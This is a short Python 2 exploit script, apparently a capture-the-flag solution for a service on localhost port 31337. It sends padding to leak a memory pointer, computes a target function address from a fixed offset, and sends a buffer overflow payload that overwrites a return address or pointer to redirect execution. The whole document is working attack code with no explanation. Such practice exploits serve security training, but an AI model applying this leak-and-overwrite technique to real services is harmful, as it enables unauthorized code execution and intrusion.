import socket as socket
import struct as struct
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("localhost", 31337))

string_one = "A" * 35 + "\n"

sock.send(string_one)

response_size = string_one.__len__() + "[+] Your name is : \n".__len__()

response = sock.recv(response_size)

print "\n[+]Got Response: " + response + "\n"

goal_pointer =  struct.unpack("I", response[52:56])[0] #calculated offset
print "\n[+]Leaked Pointer: " + hex(goal_pointer)

goal_pointer = goal_pointer - 402

print "\n[+]Target Function Address: " + hex(goal_pointer)


payload = "A" * 32 + struct.pack("<I", goal_pointer) + "\n"

print "\n[+]Sending Payload (ascii): " + payload
print "\n[+]Sending Payload (hex): " + "".join(x.encode('hex') for x in payload)
sock.send(payload)

print "\n[+]Data Received: " + sock.recv(128)[-16:] + "\n"
